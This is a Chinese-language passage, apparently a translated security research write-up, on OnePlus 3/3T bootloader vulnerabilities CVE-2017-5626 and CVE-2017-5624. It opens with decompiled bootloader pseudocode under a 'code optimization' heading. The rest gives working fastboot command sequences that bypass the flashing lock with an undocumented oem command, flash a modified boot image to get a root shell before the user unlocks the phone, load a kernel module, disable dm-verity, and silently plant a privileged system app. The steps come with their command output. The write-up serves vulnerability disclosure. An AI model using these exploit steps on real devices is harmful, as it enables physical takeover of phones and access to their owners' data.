### 代码优化

以下是优化后的代码部分，使其更加清晰和专业：

```c
if (partition_flashing_not_allowed) {
    v7 = "Partition flashing is not allowed";
    return FAIL2((int)v7, v5);
}

LABEL_23:
assert(v4, v5, v6);

v4 = sub_918428F0(v3, v5);
if (!v4 || magicFlag_dword_91989C10) {
    goto LABEL_7;
}

v6 = dword_9198D804;

// ...

v7 = "Critical partition erase is not allowed";
return FAIL2((int)v7, v5);
```

### 利用CVE-2017-5626进行内核代码执行

通过利用此漏洞，攻击者可以刷入恶意引导映像（其中包含两个内核和Root RAMFS）以获得对平台的控制。然而，引导程序和平台会检测此类修改，这被称为验证启动。引导加载程序会验证boot和recovery分区，刷入一个修改过的boot分区会在引导时触发警告。

另一个选项是刷入旧的、未修改的引导映像，因为较旧的映像可能包含已知的安全漏洞，可以被攻击者利用。

尽管存在警告（该警告在5秒后自动消失），OnePlus 3 / 3T仍然允许在红色验证状态下启动，从而使攻击者的代码得以执行。为了展示这种严重性，我选择了最简单的方法。

#### 修改引导映像

1. 将`androidboot.selinux=permissive`添加到内核命令行，以设置SELinux为宽容模式。
2. 修改RAMFS中的以下参数：
   - `ro.debuggable=1`
   - `ro.secure=0`
   - `ro.adb.secure=0`
   - 改变USB配置属性（`sys.usb.config`），包括启用ADB。

然后，我利用此漏洞刷入修改后的boot.img（evil_boot.img）：

```sh
λ fastboot flash boot evil_boot.img
target reported max download size of 440401920 bytes
sending 'boot' (14836 KB)...
OKAY [  0.335s]
writing 'boot'...
FAILED (remote: Partition flashing is not allowed)
finished. total time: 0.358s

λ fastboot oem 4F500301
...
OKAY [  0.020s]
finished. total time: 0.021s

λ fastboot flash boot evil_boot.img
target reported max download size of 440401920 bytes
sending 'boot' (14836 KB)...
OKAY [  0.342s]
writing 'boot'...
OKAY [  0.135s]
finished. total time: 0.480s
```

于是，我在用户输入凭据之前获得了root shell：

```sh
OnePlus3:/ # id
uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),
1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),
3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:su:s0

OnePlus3:/ # getenforce
Permissive
```

OnePlus 3 / 3T内核似乎是在启用LKM的情况下编译的，因此运行内核代码甚至不需要修补或重新编译内核。我创建了一个小的内核模块并将其加载到内核中：

```c
#include <linux/module.h>
#include <linux/kernel.h>

int init_module(void) {
    printk(KERN_ALERT "Hello From Kernel\n");
    return 1;
}
```

加载模块：

```sh
OnePlus3:/data/local/tmp # insmod ./test.ko
OnePlus3:/data/local/tmp # dmesg | grep Hello
[19700121_21:09:58.970409]@3 Hello From Kernel
```

### 禁用dm-verity（CVE-2017-5624）

system分区的验证不是通过boot和recovery分区，而是通过dm-verity驱动来完成的。我们发现可以通过使用FASTBOOT命令`fastboot oem disable_dm_verity`来禁止dm-verity。

`oem disable_dm_verity`处理程序如下：

```c
int sub_9183B8EC() {
    int v0; // r0@1
    int v1; // r1@1
    dmVerity_dword_91960740 = 0;
    v0 = sub_91845E10("ANDROID-BOOT!");
    if (dword_9198D804 != dword_9198D804)
        assert(v0, v1, dword_9198D804);
    return sendOK((int)"", v1);
}
```

在这个过程中，`dmVerity_dword_91960740`被设置为某些标志。引导加载程序构建内核cmdline时会使用它，并将`androidboot.enable_dm_verity`内核命令行参数传递给`ro.boot.enable_dm_verity`，从而指示OnePlus的init是否禁用dm-verity。

### 两个漏洞的组合利用

这两个漏洞可以组合在一起，用于具有特权的SELinux域代码执行，而不向用户发出任何警告并访问原始用户数据。为了演示这一点，我修改了系统分区，添加了一个特权应用程序。可以在`/system/priv-app/`目录下放置APK，最终将导致它被添加到`priv_app`域中。

```sh
λ fastboot flash system system-modded.simg
target reported max download size of 440401920 bytes
erasing 'system'...
FAILED (remote: Partition erase is not allowed)
finished. total time: 0.014s

λ fastboot oem 4F500301
OKAY
[  0.020s] finished. total time: 0.021s

λ fastboot flash system system-modded.simg
target reported max download size of 440401920 bytes erasing 'system'...
OKAY [  0.010s]
...
sending sparse 'system' 7/7 (268486 KB)...
OKAY [  6.748s]
writing 'system' 7/7...
OKAY [  3.291s]
finished. total time: 122.675s

λ fastboot oem disable_dm_verity
...
OKAY
[  0.034s] finished. total time: 0.036s
```

事实上，加载priv_app的应用程序上下文如下：

```sh
OnePlus3:/ $ getprop | grep dm_verity
[ro.boot.enable_dm_verity]: [0]

OnePlus3:/ $ ps -Z | grep roeeh
u:r:priv_app:s0:c512,c768      u0_a16    4764  2200  1716004 74600 SyS_epoll_ 0000000000 S roeeh.fooapp
```

### 演示视频

以下视频显示了结果——平台已加载且没有警告，并安装了特权应用程序。